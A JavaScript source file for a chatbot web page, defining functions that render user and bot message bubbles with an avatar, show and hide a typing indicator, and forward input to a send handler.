function addMessage(content, isUser = false) {
    const chatArea = document.getElementById('chatArea');

    const row = document.createElement('div');
    row.className = `message-row ${isUser ? 'user' : 'bot'}`;

    const bubbleWrap = document.createElement('div');
    bubbleWrap.className = 'bubble-wrap';

    if (!isUser) {
        const icon = document.createElement('div');
        icon.className = 'bot-icon';
        icon.innerHTML = '<img src="avatar.png" style="width:28px;height:28px;border-radius:50%;object-fit:cover;" alt="Étienne">';
        bubbleWrap.appendChild(icon);
    }

    const bubble = document.createElement('div');
    bubble.className = 'bubble';
    if (isUser) {
        bubble.textContent = content;
    } else {
        bubble.innerHTML = content;
    }

    bubbleWrap.appendChild(bubble);
    row.appendChild(bubbleWrap);

    const time = document.createElement('div');
    time.className = 'message-time';
    time.textContent = getTime();
    row.appendChild(time);

    chatArea.appendChild(row);
    chatArea.scrollTop = chatArea.scrollHeight;
}

function showTyping() {
    const chatArea = document.getElementById('chatArea');
    const row = document.createElement('div');
    row.className = 'typing-row';
    row.id = 'typingIndicator';

    const icon = document.createElement('div');
    icon.className = 'bot-icon';
    icon.innerHTML = '<img src="avatar.png" style="width:28px;height:28px;border-radius:50%;object-fit:cover;" alt="Étienne">';

    const bubble = document.createElement('div');
    bubble.className = 'typing-bubble';
    bubble.innerHTML = '<span></span><span></span><span></span>';

    row.appendChild(icon);
    row.appendChild(bubble);
    chatArea.appendChild(row);
    chatArea.scrollTop = chatArea.scrollHeight;
}

function hideTyping() {
    const typing = document.getElementById('typingIndicator');
    if (typing) typing.remove();
}

// Legacy aliases (kept for compatibility)
function sendMessage() { if(window.doSend) window.doSend(document.getElementById('inp') ? document.getElementById('inp').value.trim() : ''); }
function sendSuggestion(text) { if(window.doSend) window.doSend(text); }
function insertTopic(topic) { if(window.doSend) window.doSend('Tell me about ' + topic); }
function autoResize(el) { if(el){ el.style.height='auto'; el.style.height=Math.min(el.scrollHeight,100)+'px'; } }